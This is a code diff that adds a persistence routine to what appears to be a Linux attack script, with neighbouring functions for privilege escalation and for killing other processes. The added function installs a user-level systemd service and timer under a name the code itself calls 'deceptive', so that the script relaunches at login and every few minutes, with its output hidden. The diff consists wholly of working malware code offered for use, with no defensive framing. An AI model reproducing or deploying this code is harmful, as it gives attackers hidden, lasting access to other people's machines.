@@ -138,6 +138,69 @@ def privesc2():
     except Exception as e:
         print(f"[-] Failed to inject user: {e}")
         return False
+    
+def persist():
+    import os
+    import subprocess
+
+    # 1. Define the user-level systemd directory
+    systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
+    os.makedirs(systemd_user_dir, exist_ok=True)
+    
+    # 2. Choose a deceptive name for the service and create paths
+    service_name = "user-dbus-sync"
+    service_path = os.path.join(systemd_user_dir, f"{service_name}.service")
+    timer_path = os.path.join(systemd_user_dir, f"{service_name}.timer")
+    
+    # 3. Create the Service File
+    service_content = f"""[Unit]
+Description=User DBUS Synchronization Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={sys.executable} {THIS_FILE}
+Restart=on-failure
+RestartSec=10
+"""
+
+    # 4. Create the Timer File
+    # OnBootSec triggers shortly after the user logs in (or boot if lingering is enabled).
+    # OnUnitActiveSec triggers it repeatedly if it dies.
+    timer_content = f"""[Unit]
+Description=Timer for User DBUS Synchronization
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=5min
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+"""
+
+    try:
+        # Write the payload configuration to disk
+        with open(service_path, "w") as f:
+            f.write(service_content)
+        with open(timer_path, "w") as f:
+            f.write(timer_content)
+            
+        # Force the user's systemd daemon to reload its configuration from memory
+        subprocess.run(
+            ["systemctl", "--user", "daemon-reload"], 
+            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        
+        # Enable the timer so it starts automatically on login, and start it right now
+        subprocess.run(
+            ["systemctl", "--user", "enable", "--now", f"{service_name}.timer"], 
+            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        return True
+    except Exception as e:
+        print(f"Persistence setup failed: {e}")
+        return False
  
 def kill_others():
     """
